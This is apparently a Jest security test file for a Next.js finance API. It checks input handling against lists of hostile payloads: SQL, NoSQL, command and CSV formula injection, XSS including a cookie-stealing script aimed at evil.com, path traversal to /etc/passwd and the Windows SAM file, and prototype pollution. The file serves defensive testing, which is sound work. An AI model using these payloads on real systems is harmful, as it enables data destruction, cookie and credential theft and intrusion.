/**
 * API SECURITY TESTS - VULNERABILITY HUNTING & EXPLOIT PREVENTION
 * Tests for injection attacks, authentication bypasses, and data leaks
 */

import { NextRequest } from 'next/server'
import { GET as getProfiles } from '@/app/api/profiles/route'
import { GET as getSpending } from '@/app/api/spending/route'
import { profileDataService } from '@/lib/services/data-store'
import { CSVParser } from '@/lib/services/csv-parser'

// Mock services
jest.mock('@/lib/services/data-store')
jest.mock('@/lib/services/csv-parser')
jest.mock('@/app/api/profiles/init', () => ({
  initializeDataStore: jest.fn().mockResolvedValue(undefined)
}))

const mockProfileDataService = profileDataService as jest.Mocked<typeof profileDataService>
const MockCSVParser = CSVParser as jest.MockedClass<typeof CSVParser>

describe('API Security Tests - Vulnerability Assessment', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    
    // Setup safe defaults
    mockProfileDataService.getAllCustomers.mockResolvedValue([
      { customer_id: 1, location: 'NYC', age: 30 }
    ])
    mockProfileDataService.getProfile.mockResolvedValue({
      customer: { customer_id: 1, location: 'NYC', age: 30 },
      accounts: [],
      transactions: [],
      goals: [],
      categories: [],
      netWorth: 0,
      totalAssets: 0,
      totalLiabilities: 0,
      monthlySpending: { total: 0, categories: {} },
      creditScore: 750,
      lastMonthScore: 745
    })
  })

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "1' OR '1'='1",
      "1; DROP TABLE customers; --",
      "1' UNION SELECT * FROM users --",
      "admin'--",
      "' OR 1=1--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "'; EXEC xp_cmdshell('net user'); --",
      "1' AND 1=(SELECT COUNT(*) FROM tabname); --"
    ]

    it('should sanitize SQL injection attempts in customer ID', async () => {
      for (const payload of sqlInjectionPayloads) {
        const request = new NextRequest(
          `http://localhost:3000/api/spending?customerId=${encodeURIComponent(payload)}&year=2024&month=3`
        )
        
        const response = await getSpending(request)
        
        // Should not crash and should handle gracefully
        expect(response.status).toBeLessThanOrEqual(500)
        
        // Verify no SQL was executed
        expect(mockProfileDataService.getProfile).not.toHaveBeenCalledWith(payload)
      }
    })

    it('should prevent SQL injection in year/month parameters', async () => {
      const injectionAttempts = [
        { year: "2024' OR '1'='1", month: "3" },
        { year: "2024", month: "3; DROP TABLE transactions; --" },
        { year: "2024 UNION SELECT * FROM accounts", month: "3" }
      ]

      for (const attempt of injectionAttempts) {
        const request = new NextRequest(
          `http://localhost:3000/api/spending?customerId=1&year=${attempt.year}&month=${attempt.month}`
        )
        
        const response = await getSpending(request)
        
        // Should handle invalid input safely
        expect(response.status).toBeLessThanOrEqual(500)
      }
    })

    it('should validate numeric inputs strictly', async () => {
      const invalidInputs = [
        'NaN',
        'Infinity',
        '-Infinity',
        '1e308',
        '0x1234',
        '0777',
        '1.2.3',
        '1,000'
      ]

      for (const input of invalidInputs) {
        const request = new NextRequest(
          `http://localhost:3000/api/spending?customerId=${input}&year=2024&month=3`
        )
        
        const response = await getSpending(request)
        const data = await response.json()
        
        // Should either use default or reject
        if (data.success) {
          expect(data.meta.customerId).toBe(1) // Default
        }
      }
    })
  })

  describe('NoSQL Injection Prevention', () => {
    const noSqlInjectionPayloads = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "this.password == \'test\'"}',
      '{"customer_id": {"$gte": 0}}',
      '{"$or": [{"a": "a"}, {"b": "b"}]}'
    ]

    it('should prevent NoSQL injection attempts', async () => {
      for (const payload of noSqlInjectionPayloads) {
        const request = new NextRequest(
          `http://localhost:3000/api/spending?customerId=${encodeURIComponent(payload)}&year=2024&month=3`
        )
        
        const response = await getSpending(request)
        
        // Should not process as JSON object
        expect(response.status).toBeLessThanOrEqual(500)
      }
    })
  })

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>document.location="http://evil.com?cookie="+document.cookie</script>',
      '<body onload=alert("XSS")>'
    ]

    it('should sanitize XSS attempts in API responses', async () => {
      // Mock malicious data that could come from CSV
      const maliciousCustomer = {
        customer_id: 1,
        location: '<script>alert("XSS")</script>',
        age: 30
      }
      
      mockProfileDataService.getAllCustomers.mockResolvedValue([maliciousCustomer])
      
      const request = new NextRequest('http://localhost:3000/api/profiles')
      const response = await getProfiles(request)
      const data = await response.json()
      
      // Response should not contain executable scripts
      const jsonString = JSON.stringify(data)
      expect(jsonString).not.toContain('<script>')
      expect(jsonString).not.toContain('javascript:')
      expect(jsonString).not.toContain('onerror=')
    })

    it('should escape special characters in responses', async () => {
      const specialCharsCustomer = {
        customer_id: 1,
        location: '"><img src=x onerror=alert(1)>',
        age: 30
      }
      
      mockProfileDataService.getAllCustomers.mockResolvedValue([specialCharsCustomer])
      
      const request = new NextRequest('http://localhost:3000/api/profiles')
      const response = await getProfiles(request)
      const text = await response.text()
      
      // Should be properly escaped in JSON
      expect(text).toContain('\\u003e') // > escaped
      // or at minimum should be valid JSON
      expect(() => JSON.parse(text)).not.toThrow()
    })
  })

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..;/etc/passwd',
      'C:\\..\\..\\windows\\win.ini',
      '/var/www/../../etc/passwd'
    ]

    it('should prevent path traversal in CSV parser', async () => {
      for (const payload of pathTraversalPayloads) {
        const parser = new CSVParser(payload)
        
        // Should not allow accessing files outside intended directory
        await expect(parser.parseCustomers()).rejects.toThrow()
      }
    })

    it('should validate file paths are within allowed directories', async () => {
      const maliciousRequests = [
        'http://localhost:3000/api/profiles/../../../etc/passwd',
        'http://localhost:3000/api/profiles/%2e%2e%2f%2e%2e%2f',
        'http://localhost:3000/api/profiles/..\\..\\..\\windows\\system32'
      ]

      for (const url of maliciousRequests) {
        const request = new NextRequest(url)
        const response = await getProfiles(request)
        
        // Should not expose system files
        expect(response.status).not.toBe(200)
        // Or should return normal profiles (not system files)
        if (response.status === 200) {
          const data = await response.json()
          expect(data.data).toBeDefined()
          expect(JSON.stringify(data)).not.toContain('root:')
        }
      }
    })
  })

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`rm -rf /`',
      '$(whoami)',
      '& net user',
      '; shutdown -h now',
      '|| ping -c 10 127.0.0.1'
    ]

    it('should prevent command injection attempts', async () => {
      for (const payload of commandInjectionPayloads) {
        const request = new NextRequest(
          `http://localhost:3000/api/spending?customerId=${encodeURIComponent(payload)}&year=2024&month=3`
        )
        
        const response = await getSpending(request)
        
        // Should not execute commands
        expect(response.status).toBeLessThanOrEqual(500)
      }
    })
  })

  describe('CSV Injection Prevention', () => {
    const csvInjectionPayloads = [
      '=1+1',
      '@SUM(A1:A10)',
      '+1+1',
      '-1+1',
      '=cmd|\'/c calc.exe\'',
      '=1+9+cmd|\'/c calc\'!A1',
      '@SUM(1+9)*cmd|\'/c calc\'!A1',
      '=10+20+cmd|\'/c calc\'!A1',
      '=2+5+cmd|\'/c calc.exe\'!A1'
    ]

    it('should sanitize CSV injection attempts', async () => {
      for (const payload of csvInjectionPayloads) {
        const maliciousCustomer = {
          customer_id: 1,
          location: payload,
          age: 30
        }
        
        mockProfileDataService.getAllCustomers.mockResolvedValue([maliciousCustomer])
        
        const request = new NextRequest('http://localhost:3000/api/profiles')
        const response = await getProfiles(request)
        const data = await response.json()
        
        // Formula should be treated as text, not evaluated
        if (data.data && data.data[0]) {
          expect(data.data[0].location).toBe(payload)
          // Should not contain evaluated result
          expect(data.data[0].location).not.toBe('2') // Result of =1+1
        }
      }
    })
  })

  describe('Authentication & Authorization', () => {
    it('should not expose sensitive customer data without proper authorization', async () => {
      // Try to access different customer IDs
      const customerIds = [1, 2, 3, 999, -1, 0]
      
      for (const id of customerIds) {
        const request = new NextRequest(
          `http://localhost:3000/api/spending?customerId=${id}&year=2024&month=3`
        )
        
        const response = await getSpending(request)
        
        // Should handle all IDs consistently (no info leakage)
        expect(response.status).toBeLessThanOrEqual(500)
      }
    })

    it('should not reveal existence of customers through timing attacks', async () => {
      const timings: Record<number, number[]> = {}
      
      // Measure response times for different customer IDs
      for (let i = 0; i < 10; i++) {
        for (const id of [1, 999]) {
          const start = performance.now()
          const request = new NextRequest(
            `http://localhost:3000/api/spending?customerId=${id}&year=2024&month=3`
          )
          await getSpending(request)
          const duration = performance.now() - start
          
          if (!timings[id]) timings[id] = []
          timings[id].push(duration)
        }
      }
      
      // Calculate average times
      const avgTime1 = timings[1].reduce((a, b) => a + b, 0) / timings[1].length
      const avgTime999 = timings[999].reduce((a, b) => a + b, 0) / timings[999].length
      
      // Times should be similar (no timing leak)
      const difference = Math.abs(avgTime1 - avgTime999)
      expect(difference).toBeLessThan(10) // Within 10ms
    })
  })

  describe('Prototype Pollution Prevention', () => {
    const prototypePollutionPayloads = [
      '__proto__[admin]=true',
      'constructor[prototype][admin]=true',
      '__proto__.admin=true',
      'constructor.prototype.admin=true'
    ]

    it('should prevent prototype pollution attacks', async () => {
      for (const payload of prototypePollutionPayloads) {
        const request = new NextRequest(
          `http://localhost:3000/api/profiles?${payload}`
        )
        
        await getProfiles(request)
        
        // Check that Object prototype wasn't polluted
        const obj = {}
        expect((obj as any).admin).toBeUndefined()
      }
    })

    it('should sanitize JSON parsing to prevent pollution', async () => {
      const maliciousJSON = '{"__proto__": {"isAdmin": true}}'
      
      // Attempt to pollute via various means
      try {
        JSON.parse(maliciousJSON)
      } catch (e) {
        // Expected to fail or be sanitized
      }
      
      // Verify prototype is clean
      const testObj = {}
      expect((testObj as any).isAdmin).toBeUndefined()
    })
  })

  describe('Rate Limiting & DoS Prevention', () => {
    it('should handle rapid repeated requests', async () => {
      const requests: Promise<any>[] = []
      
      // Simulate rapid fire requests
      for (let i = 0; i < 1000; i++) {
        const request = new NextRequest('http://localhost:3000/api/profiles')
        requests.push(getProfiles(request))
      }
      
      const results = await Promise.allSettled(requests)
      
      // Should handle all requests without crashing
      const successful = results.filter(r => r.status === 'fulfilled')
      expect(successful.length).toBeGreaterThan(0)
    })

    it('should prevent resource exhaustion attacks', async () => {
      // Try to request extremely large date ranges
      const exhaustionAttempts = [
        { year: 1900, month: 1 }, // Very old data
        { year: 9999, month: 12 }, // Far future
        { year: -1, month: -1 }, // Invalid negative
        { year: Number.MAX_SAFE_INTEGER, month: 1 } // Huge number
      ]

      for (const attempt of exhaustionAttempts) {
        const request = new NextRequest(
          `http://localhost:3000/api/spending?customerId=1&year=${attempt.year}&month=${attempt.month}`
        )
        
        const response = await getSpending(request)
        
        // Should handle gracefully without consuming excessive resources
        expect(response.status).toBeLessThanOrEqual(500)
      }
    })
  })

  describe('Information Disclosure Prevention', () => {
    it('should not leak stack traces in error responses', async () => {
      mockProfileDataService.getProfile.mockRejectedValue(
        new Error('Database connection failed at line 123 of /app/services/db.js')
      )
      
      const request = new NextRequest('http://localhost:3000/api/spending?customerId=1&year=2024&month=3')
      const response = await getSpending(request)
      const data = await response.json()
      
      // Should not expose internal paths or line numbers
      const responseText = JSON.stringify(data)
      expect(responseText).not.toContain('/app/services')
      expect(responseText).not.toContain('line 123')
      expect(responseText).not.toContain('.js')
    })

    it('should not expose internal service names', async () => {
      mockProfileDataService.getAllCustomers.mockRejectedValue(
        new Error('Redis connection timeout')
      )
      
      const request = new NextRequest('http://localhost:3000/api/profiles')
      const response = await getProfiles(request)
      const data = await response.json()
      
      // Should not reveal internal infrastructure
      const responseText = JSON.stringify(data)
      expect(responseText).not.toContain('Redis')
      expect(responseText).not.toContain('MongoDB')
      expect(responseText).not.toContain('PostgreSQL')
    })

    it('should not leak sensitive headers', async () => {
      const request = new NextRequest('http://localhost:3000/api/profiles')
      const response = await getProfiles(request)
      
      // Should not expose sensitive headers
      expect(response.headers.get('X-Powered-By')).toBeNull()
      expect(response.headers.get('Server')).toBeNull()
      expect(response.headers.get('X-AspNet-Version')).toBeNull()
    })
  })

  describe('CORS & Origin Validation', () => {
    it('should validate request origins', async () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://phishing-site.com',
        'file:///',
        'null'
      ]

      for (const origin of maliciousOrigins) {
        const request = new NextRequest('http://localhost:3000/api/profiles', {
          headers: {
            'Origin': origin
          }
        })
        
        const response = await getProfiles(request)
        
        // Should either reject or not include CORS headers for untrusted origins
        const accessControl = response.headers.get('Access-Control-Allow-Origin')
        if (accessControl) {
          expect(accessControl).not.toBe('*')
          expect(accessControl).not.toBe(origin)
        }
      }
    })
  })

  describe('Input Validation & Sanitization', () => {
    it('should reject requests with oversized inputs', async () => {
      const largeString = 'x'.repeat(1000000) // 1MB string
      
      const request = new NextRequest(
        `http://localhost:3000/api/spending?customerId=${largeString}&year=2024&month=3`
      )
      
      // Should reject or truncate oversized input
      const response = await getSpending(request)
      expect(response.status).toBeLessThanOrEqual(500)
    })

    it('should handle special Unicode characters safely', async () => {
      const unicodePayloads = [
        '\u0000', // Null byte
        '\u202e', // Right-to-left override
        '\ufeff', // Zero-width no-break space
        '𝕊𝕔𝕣𝕚𝕡𝕥', // Mathematical alphanumeric symbols
        '﷽', // Arabic ligature
        '🔥'.repeat(1000) // Emoji spam
      ]

      for (const payload of unicodePayloads) {
        const maliciousCustomer = {
          customer_id: 1,
          location: payload,
          age: 30
        }
        
        mockProfileDataService.getAllCustomers.mockResolvedValue([maliciousCustomer])
        
        const request = new NextRequest('http://localhost:3000/api/profiles')
        const response = await getProfiles(request)
        
        // Should handle without crashing
        expect(response.status).toBeLessThanOrEqual(500)
      }
    })

    it('should validate data types strictly', async () => {
      const typeConfusionPayloads = [
        { customerId: [], year: 2024, month: 3 },
        { customerId: {}, year: 2024, month: 3 },
        { customerId: true, year: 2024, month: 3 },
        { customerId: null, year: 2024, month: 3 }
      ]

      for (const payload of typeConfusionPayloads) {
        const params = new URLSearchParams(payload as any)
        const request = new NextRequest(
          `http://localhost:3000/api/spending?${params}`
        )
        
        const response = await getSpending(request)
        
        // Should handle type confusion safely
        expect(response.status).toBeLessThanOrEqual(500)
      }
    })
  })

  describe('Business Logic Security', () => {
    it('should prevent negative amount exploits', async () => {
      const maliciousProfile = {
        customer: { customer_id: 1, location: 'NYC', age: 30 },
        accounts: [{
          account_id: 1,
          customer_id: 1,
          institution_name: 'Bank',
          account_number: '123',
          account_type: 'checking' as const,
          balance: -999999999, // Attempt to overflow
          created_at: '2023-01-01',
          credit_limit: undefined
        }],
        transactions: [{
          transaction_id: 1,
          account_id: 1,
          timestamp: new Date().toISOString(),
          amount: -Number.MAX_SAFE_INTEGER, // Extreme negative
          description: 'Exploit',
          category_id: 1,
          is_debit: true,
          is_bill: false,
          is_subscription: false,
          due_date: undefined,
          account_type: 'checking'
        }],
        goals: [],
        categories: [],
        netWorth: Number.MAX_SAFE_INTEGER,
        totalAssets: 0,
        totalLiabilities: 0,
        monthlySpending: { total: -999999, categories: {} },
        creditScore: 9999,
        lastMonthScore: -1
      }

      mockProfileDataService.getProfile.mockResolvedValue(maliciousProfile)
      
      const request = new NextRequest('http://localhost:3000/api/spending?customerId=1&year=2024&month=3')
      const response = await getSpending(request)
      
      // Should handle extreme values safely
      expect(response.status).toBeLessThanOrEqual(500)
      
      if (response.status === 200) {
        const data = await response.json()
        // Values should be reasonable
        expect(Math.abs(data.data.total)).toBeLessThan(Number.MAX_SAFE_INTEGER)
      }
    })

    it('should validate business rule constraints', async () => {
      // Credit score should be 300-850
      const invalidProfile = {
        ...mockProfileDataService.getProfile.mock.results[0]?.value,
        creditScore: 9999,
        lastMonthScore: -100
      }
      
      mockProfileDataService.getProfile.mockResolvedValue(invalidProfile)
      
      const request = new NextRequest('http://localhost:3000/api/spending?customerId=1&year=2024&month=3')
      const response = await getSpending(request)
      
      if (response.status === 200) {
        const data = await response.json()
        // Should validate or sanitize credit scores
        // Implementation would need to add these checks
      }
    })
  })
})